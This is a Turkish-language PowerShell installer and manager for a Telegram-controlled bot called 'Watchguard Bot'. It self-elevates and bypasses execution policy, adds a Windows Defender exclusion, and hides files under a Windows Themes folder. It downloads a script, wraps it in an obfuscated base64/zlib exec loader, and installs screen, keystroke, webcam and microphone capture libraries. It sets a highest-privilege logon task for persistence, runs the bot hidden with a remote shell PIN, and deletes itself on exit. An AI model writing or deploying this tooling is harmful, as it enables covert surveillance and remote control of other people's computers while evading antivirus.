#Requires -Version 5.1
<#
.SYNOPSIS
    Watchguard Bot v3.0 - Yonetim Araci
.DESCRIPTION
    Kurulum, kaldirma ve proses yonetimi icin TUI menu.
#>

# ── UTF-8 konsol ─────────────────────────────────────────────────────────────
$null = cmd /c "chcp 65001"
[Console]::InputEncoding  = [System.Text.Encoding]::UTF8
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$OutputEncoding            = [System.Text.Encoding]::UTF8

# ── Admin yetkisi (kendini yukseltiyor) ──────────────────────────────────────
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
           ).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Host ""
    Write-Host "  [!] Admin yetkisi gerekiyor - UAC penceresi acilacak..." -ForegroundColor Yellow
    Write-Host ""
    Start-Process powershell -Verb RunAs -ArgumentList `
        "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    exit
}

# ══════════════════════════════════════════════════════════════════════════════
# YARDIMCI FONKSİYONLAR
# ══════════════════════════════════════════════════════════════════════════════

function Write-Banner {
    Clear-Host
    Write-Host ""
    Write-Host "  ============================================================" -ForegroundColor Cyan
    Write-Host "       Watchguard Bot v3.0  --  Yonetim Araci               " -ForegroundColor Cyan
    Write-Host "  ============================================================" -ForegroundColor Cyan
    Write-Host ""
}

function Write-Header {
    param([string]$Text)
    Write-Host ""
    Write-Host ("  " + "=" * 56) -ForegroundColor Cyan
    Write-Host "  $Text" -ForegroundColor Cyan
    Write-Host ("  " + "=" * 56) -ForegroundColor Cyan
    Write-Host ""
}

function Write-Step  { param([string]$T); Write-Host "  [*] $T" -ForegroundColor Yellow }
function Write-OK    { param([string]$T); Write-Host "  [+] $T" -ForegroundColor Green  }
function Write-Err   { param([string]$T); Write-Host "  [!] $T" -ForegroundColor Red    }
function Write-Info  { param([string]$T); Write-Host "      $T" -ForegroundColor Gray   }

# ── Ortak degiskenler ─────────────────────────────────────────────────────────
$watchguardDir = Join-Path $env:APPDATA "Microsoft\Windows\Themes\Watchguard"
$datPath       = Join-Path $watchguardDir "watchguard.dat"
$scriptDest    = Join-Path $watchguardDir "watchguard_v3.pyw"
$scriptUrl     = "https://raw.githubusercontent.com/zygomatic-git/watchguard/main/watchguard_v3.pyw"
$taskName      = "WatchguardBot"

# ══════════════════════════════════════════════════════════════════════════════
# PYTHON BUL
# ══════════════════════════════════════════════════════════════════════════════

function Find-Python {
    try {
        $out = & py --version 2>&1
        if ($LASTEXITCODE -eq 0) {
            $exePath = (Get-Command py -ErrorAction SilentlyContinue).Source
            if ($exePath) {
                $wExe = Join-Path (Split-Path $exePath) "pythonw.exe"
                if (-not (Test-Path $wExe)) {
                    $pwCmd = Get-Command pythonw.exe -ErrorAction SilentlyContinue
                    if ($pwCmd) { $wExe = $pwCmd.Source } else { $wExe = $null }
                }
                return @{ python = $exePath; pythonw = $wExe; version = $out.ToString() }
            }
        }
    } catch {}

    $pw = Get-Command pythonw.exe -ErrorAction SilentlyContinue
    $p  = Get-Command python.exe  -ErrorAction SilentlyContinue
    if ($pw -and $p) {
        $ver = & python.exe --version 2>&1
        return @{ python = $p.Source; pythonw = $pw.Source; version = $ver.ToString() }
    }

    $candidates = @(
        "$env:LOCALAPPDATA\Programs\Python\Python314",
        "$env:LOCALAPPDATA\Programs\Python\Python313",
        "$env:LOCALAPPDATA\Programs\Python\Python312",
        "$env:LOCALAPPDATA\Programs\Python\Python311",
        "$env:LOCALAPPDATA\Programs\Python\Python310",
        "C:\Python312", "C:\Python311", "C:\Python310",
        "$env:ProgramFiles\Python312", "$env:ProgramFiles\Python311"
    )
    foreach ($dir in $candidates) {
        $pExe  = Join-Path $dir "python.exe"
        $pwExe = Join-Path $dir "pythonw.exe"
        if ((Test-Path $pExe) -and (Test-Path $pwExe)) {
            $ver = & $pExe --version 2>&1
            return @{ python = $pExe; pythonw = $pwExe; version = $ver.ToString() }
        }
    }
    return $null
}

# ══════════════════════════════════════════════════════════════════════════════
# EYLEM 1: KUR / YENİDEN KUR
# ══════════════════════════════════════════════════════════════════════════════

function Invoke-Install {
    Write-Banner
    Write-Header "KUR / YENIDEN KUR"

    # Mevcut kurulum varsa uyar
    if (Test-Path $datPath) {
        Write-Host "  [!] Mevcut kurulum tespit edildi." -ForegroundColor Yellow
        $confirm = Read-Host "  Uzerine yazmak istiyor musunuz? (E/H)"
        if ($confirm -notmatch '^[Ee]') {
            Write-Info "Iptal edildi."
            return
        }
        Invoke-KillProcesses -Silent
    }

    # ── ADIM 1: Bot bilgileri ─────────────────────────────────────────────────
    Write-Header "ADIM 1/7 - Bot Bilgileri"

    $token = ""
    while ($token -eq "") {
        $token = (Read-Host "  Bot Token (BotFather'dan alinan)").Trim()
        if ($token -eq "") { Write-Err "Bot Token bos olamaz." }
    }
    Write-OK "Bot Token alindi"

    $ownerId = ""
    while ($ownerId -eq "") {
        $raw = (Read-Host "  Owner ID (Telegram kullanici ID'niz)").Trim()
        if ($raw -match '^\d+$') { $ownerId = $raw }
        else { Write-Err "Owner ID sadece rakam icermeli. Ornek: 210965041" }
    }
    Write-OK "Owner ID alindi: $ownerId"

    $pinRaw = (Read-Host "  Shell PIN (opsiyonel - sadece rakam, bos = PIN yok)").Trim()
    if ($pinRaw -match '^\d+$') {
        $pin = $pinRaw
        Write-OK "Shell PIN alindi"
    } else {
        $pin = "null"
        Write-Info "Shell PIN atlatildi"
    }

    # ── ADIM 2: Defender istisna ──────────────────────────────────────────────
    Write-Header "ADIM 2/7 - Antivirus Istisnasi"

    Write-Step "Windows Defender istisna ekleniyor..."
    Write-Info "Konum: $watchguardDir"
    try {
        Add-MpPreference -ExclusionPath $watchguardDir -ErrorAction Stop
        Write-OK "Defender istisna eklendi"
    } catch {
        Write-Err "Defender istisna eklenemedi (ucuncu taraf AV olabilir)"
        Write-Info "Antivirüs programinizdan su klasoru istisna ekleyin:"
        Write-Info "  $watchguardDir"
        Write-Host ""
        Read-Host "  Istisnayi ekledikten sonra Enter'a basin"
    }

    # ── ADIM 3: Python ────────────────────────────────────────────────────────
    Write-Header "ADIM 3/7 - Python"

    Write-Step "Python aranıyor..."
    $pyInfo = Find-Python

    if ($pyInfo) {
        $pythonExe  = $pyInfo.python
        $pythonwExe = $pyInfo.pythonw
        Write-OK "Python bulundu: $($pyInfo.version)"
        Write-Info "python.exe  : $pythonExe"
        Write-Info "pythonw.exe : $pythonwExe"
    } else {
        Write-Step "Python bulunamadi - yuklemeye calisiliyor..."
        $wingetOk = $false
        try {
            $wg = Get-Command winget -ErrorAction SilentlyContinue
            if ($wg) {
                Write-Info "winget ile Python 3.12 yukleniyor..."
                & winget install Python.Python.3.12 --silent --accept-package-agreements --accept-source-agreements
                if ($LASTEXITCODE -eq 0) { $wingetOk = $true; Write-OK "winget kurulumu tamamlandi" }
            }
        } catch {}

        if (-not $wingetOk) {
            Write-Info "winget basarisiz - python.org'dan indiriliyor..."
            $installerUrl  = "https://www.python.org/ftp/python/3.12.0/python-3.12.0-amd64.exe"
            $installerPath = Join-Path $env:TEMP "python_installer.exe"
            try {
                Invoke-WebRequest -Uri $installerUrl -OutFile $installerPath -UseBasicParsing
                Start-Process -FilePath $installerPath `
                    -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_launcher=1" -Wait
                Write-OK "Python kurulumu tamamlandi"
            } catch {
                Write-Err "Python indirilemedi/kurulamadi: $_"
                Write-Info "Lutfen https://python.org adresinden Python 3.10+ yukleyin."
                Read-Host "  Cikis icin Enter'a basin"
                return
            }
        }

        $pyInfo = Find-Python
        if ($pyInfo) {
            $pythonExe  = $pyInfo.python
            $pythonwExe = $pyInfo.pythonw
            Write-OK "Python hazir: $($pyInfo.version)"
        } else {
            Write-Err "Python hala bulunamadi. PATH'i guncelleyip tekrar deneyin."
            Read-Host "  Cikis icin Enter'a basin"
            return
        }
    }

    if (-not $pythonwExe -or -not (Test-Path $pythonwExe)) {
        Write-Info "pythonw.exe bulunamadi - python.exe kullanilacak"
        $pythonwExe = $pythonExe
    }

    # ── ADIM 4: watchguard.dat ────────────────────────────────────────────────
    Write-Header "ADIM 4/7 - Yapilandirma Dosyasi"

    Write-Step "watchguard.dat olusturuluyor..."
    New-Item -ItemType Directory -Force -Path $watchguardDir | Out-Null

    $pyDat = @"
import zlib, base64, json, os, sys
token     = sys.argv[1]
owner_id  = int(sys.argv[2])
pin_arg   = sys.argv[3]
shell_pin = int(pin_arg) if pin_arg != 'null' else None
data      = {'bot_token': token, 'owner_id': owner_id, 'shell_pin': shell_pin}
dat_path  = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Themes', 'Watchguard', 'watchguard.dat')
os.makedirs(os.path.dirname(dat_path), exist_ok=True)
encoded   = base64.b64encode(zlib.compress(json.dumps(data).encode('utf-8'))).decode('utf-8')
open(dat_path, 'w', encoding='utf-8').write(encoded)
print('OK:' + dat_path)
"@
    $tmpDat = [System.IO.Path]::GetTempFileName() + '.py'
    $pyDat | Out-File -FilePath $tmpDat -Encoding UTF8 -NoNewline
    try {
        $result = & $pythonExe $tmpDat $token $ownerId $pin 2>&1
        if ($result -like "OK:*") { Write-OK "watchguard.dat olusturuldu" }
        else { Write-Err "watchguard.dat olusturulamadi: $result"; return }
    } catch { Write-Err "Hata: $_"; return }
    finally  { Remove-Item $tmpDat -Force -ErrorAction SilentlyContinue }

    # ── ADIM 5: Script indir + obfüske et ────────────────────────────────────
    Write-Header "ADIM 5/7 - Bot Scripti"

    $tempScript = [System.IO.Path]::GetTempFileName() + '.pyw'
    $localScript = Join-Path $PSScriptRoot "watchguard_v3.pyw"

    if (Test-Path $localScript) {
        Write-Step "Yerel watchguard_v3.pyw kullaniliyor..."
        Copy-Item $localScript $tempScript -Force
        Write-OK "Kaynak hazir (yerel)"
    } else {
        Write-Step "watchguard_v3.pyw GitHub'tan indiriliyor..."
        try {
            Invoke-WebRequest -Uri $scriptUrl -OutFile $tempScript -UseBasicParsing
            Write-OK "Script indirildi"
        } catch {
            Write-Err "Indirme hatasi: $_"
            Read-Host "  Cikis icin Enter'a basin"
            return
        }
    }

    Write-Step "Obfuskasyon uygulanıyor..."
    $pyObf = @"
import zlib, base64, sys
src = sys.argv[1]; dst = sys.argv[2]
source  = open(src, 'r', encoding='utf-8').read()
encoded = base64.b64encode(zlib.compress(source.encode('utf-8'))).decode('ascii')
loader  = "import zlib,base64;exec(zlib.decompress(base64.b64decode(b'" + encoded + "')).decode())"
open(dst, 'w', encoding='utf-8').write(loader)
print('OK')
"@
    $tmpObf = [System.IO.Path]::GetTempFileName() + '.py'
    $pyObf | Out-File -FilePath $tmpObf -Encoding UTF8 -NoNewline
    try {
        $r = & $pythonExe $tmpObf $tempScript $scriptDest 2>&1
        if ($r -like "OK*") { Write-OK "Script obfüske edildi: $scriptDest" }
        else { Write-Err "Obfuskasyon hatasi: $r"; return }
    } catch { Write-Err "Hata: $_"; return }
    finally  { Remove-Item $tmpObf, $tempScript -Force -ErrorAction SilentlyContinue }

    # ── ADIM 6: Python paketleri ──────────────────────────────────────────────
    Write-Header "ADIM 6/7 - Python Paketleri"

    Write-Step "pip guncelleniyor..."
    & $pythonExe -m pip install --upgrade pip --quiet 2>&1 | Out-Null

    $packages = @(
        "pyTelegramBotAPI","pyautogui","pillow","psutil",
        "opencv-python","numpy","pynput","screeninfo",
        "mss","sounddevice","soundfile","dxcam"
    )
    Write-Step "Bagimliliklar yukleniyor ($($packages.Count) paket)..."
    & $pythonExe -m pip install @packages --quiet 2>&1 | Out-Null
    if ($LASTEXITCODE -eq 0) { Write-OK "Tum paketler yuklendi" }
    else { Write-Err "Bazi paketler yuklenemedi — bot yine de calisabilir" }

    # ── ADIM 7: Task Scheduler ────────────────────────────────────────────────
    Write-Header "ADIM 7/7 - Task Scheduler"

    Write-Step "Gorev olusturuluyor..."
    cmd /c "schtasks /Delete /F /TN $taskName" 2>$null | Out-Null
    $r = cmd /c "schtasks /Create /F /RL HIGHEST /SC ONLOGON /TN $taskName /TR `"`"$pythonwExe`" `"$scriptDest`"`" /RU $env:USERNAME" 2>&1
    if ($LASTEXITCODE -eq 0) { Write-OK "Task Scheduler gorevi olusturuldu: $taskName" }
    else {
        Write-Err "Task Scheduler gorevi olusturulamadi"
        Write-Info "Manuel eklemek icin: Program=$pythonwExe  Arguman=`"$scriptDest`""
    }

    # ── Botu baslatmak istiyor mu? ────────────────────────────────────────────
    Write-Host ""
    $startNow = Read-Host "  Botu simdi baslatmak ister misiniz? (E/H)"
    if ($startNow -match '^[Ee]') {
        Start-Process -FilePath $pythonwExe -ArgumentList "`"$scriptDest`"" -WindowStyle Hidden
        Write-OK "Bot baslatildi — Telegram'dan bildirim bekleniyor..."
    } else {
        Write-Info "Bot bir sonraki oturum acilisinda otomatik baslar."
    }

    # ── Ozet ──────────────────────────────────────────────────────────────────
    Write-Header "KURULUM TAMAMLANDI"
    Write-Host "  Bot scripti  : $scriptDest"   -ForegroundColor Gray
    Write-Host "  Config       : $datPath"       -ForegroundColor Gray
    Write-Host "  Task         : $taskName"      -ForegroundColor Gray
    Write-Host ""
    Write-Host "  Watchguard Bot hazir!" -ForegroundColor Green
    Write-Host ""
}

# ══════════════════════════════════════════════════════════════════════════════
# EYLEM 2: KALDIR
# ══════════════════════════════════════════════════════════════════════════════

function Invoke-Uninstall {
    Write-Banner
    Write-Header "KALDIR"

    Write-Host "  [!] Asagidakiler silinecek:" -ForegroundColor Yellow
    Write-Host "      - Tum pythonw.exe prosesleri" -ForegroundColor Gray
    Write-Host "      - Task Scheduler gorevi: $taskName" -ForegroundColor Gray
    Write-Host "      - $watchguardDir" -ForegroundColor Gray
    Write-Host "      - Windows Defender istisna" -ForegroundColor Gray
    Write-Host ""
    $confirm = Read-Host "  Emin misiniz? (E/H)"
    if ($confirm -notmatch '^[Ee]') {
        Write-Info "Iptal edildi."
        return
    }

    Write-Step "Prosesler durduruluyor..."
    $killed = Invoke-KillProcesses -Silent
    if ($killed) { Write-OK "Prosesler durduruldu" }
    else         { Write-Info "Calisan proses bulunamadi" }

    Write-Step "Task Scheduler gorevi siliniyor..."
    cmd /c "schtasks /Delete /F /TN $taskName" 2>$null | Out-Null
    if ($LASTEXITCODE -eq 0) { Write-OK "Gorev silindi" }
    else                     { Write-Info "Gorev zaten yoktu" }

    Write-Step "Dosyalar siliniyor..."
    if (Test-Path $watchguardDir) {
        Remove-Item $watchguardDir -Recurse -Force -ErrorAction SilentlyContinue
        Write-OK "Klasor silindi: $watchguardDir"
    } else {
        Write-Info "Klasor zaten yoktu"
    }

    Write-Step "Defender istisna kaldiriliyor..."
    try {
        Remove-MpPreference -ExclusionPath $watchguardDir -ErrorAction Stop
        Write-OK "Defender istisna kaldirildi"
    } catch {
        Write-Info "Defender istisna kaldirilamadi (veya zaten yoktu)"
    }

    Write-Host ""
    Write-OK "Watchguard Bot tamamen kaldirildi."
    Write-Host ""
}

# ══════════════════════════════════════════════════════════════════════════════
# EYLEM 3: PROSESLERİ DURDUR
# ══════════════════════════════════════════════════════════════════════════════

function Invoke-KillProcesses {
    param([switch]$Silent)

    $procs = Get-Process -Name "pythonw" -ErrorAction SilentlyContinue
    if (-not $procs) {
        if (-not $Silent) {
            Write-Host ""
            Write-Info "Calisan pythonw.exe prosesi bulunamadi."
            Write-Host ""
        }
        return $false
    }

    if (-not $Silent) {
        Write-Host ""
        Write-Host "  Bulunan prosesler:" -ForegroundColor Yellow
        $procs | ForEach-Object { Write-Host "    PID $($_.Id)  Bellek: $([math]::Round($_.WorkingSet64/1MB,1)) MB" -ForegroundColor Gray }
        Write-Host ""
    }

    $procs | Stop-Process -Force -ErrorAction SilentlyContinue

    if (-not $Silent) {
        Write-OK "$($procs.Count) proses durduruldu."
        Write-Host ""
    }
    return $true
}

# ══════════════════════════════════════════════════════════════════════════════
# ANA MENU
# ══════════════════════════════════════════════════════════════════════════════

while ($true) {
    Write-Banner

    # Kurulum durumunu goster
    if (Test-Path $datPath) {
        Write-Host "  Durum : " -NoNewline -ForegroundColor Gray
        Write-Host "Kurulu " -NoNewline -ForegroundColor Green
        $running = (Get-Process -Name "pythonw" -ErrorAction SilentlyContinue).Count
        if ($running -gt 0) { Write-Host "| Calisiyor ($running proses)" -ForegroundColor Green }
        else                 { Write-Host "| Durdu" -ForegroundColor Yellow }
    } else {
        Write-Host "  Durum : " -NoNewline -ForegroundColor Gray
        Write-Host "Kurulu degil" -ForegroundColor Red
    }

    Write-Host ""
    Write-Host "  --------------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "  [1]  Kur / Yeniden Kur" -ForegroundColor White
    Write-Host "  [2]  Kaldir (Uninstall)" -ForegroundColor White
    Write-Host "  [3]  Calisanlari Durdur" -ForegroundColor White
    Write-Host "  [4]  Cikis" -ForegroundColor White
    Write-Host "  --------------------------------------------------------" -ForegroundColor DarkGray
    Write-Host ""

    $choice = Read-Host "  Seciminiz"

    switch ($choice.Trim()) {
        "1" { Invoke-Install;         Read-Host "  Ana menuye donmek icin Enter'a basin" }
        "2" { Invoke-Uninstall;       Read-Host "  Ana menuye donmek icin Enter'a basin" }
        "3" { Invoke-KillProcesses;   Read-Host "  Ana menuye donmek icin Enter'a basin" }
        "4" {
            # Kendini sil ve cik
            Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue
            exit
        }
        default { Write-Host "  Gecersiz secim." -ForegroundColor Red; Start-Sleep 1 }
    }
}
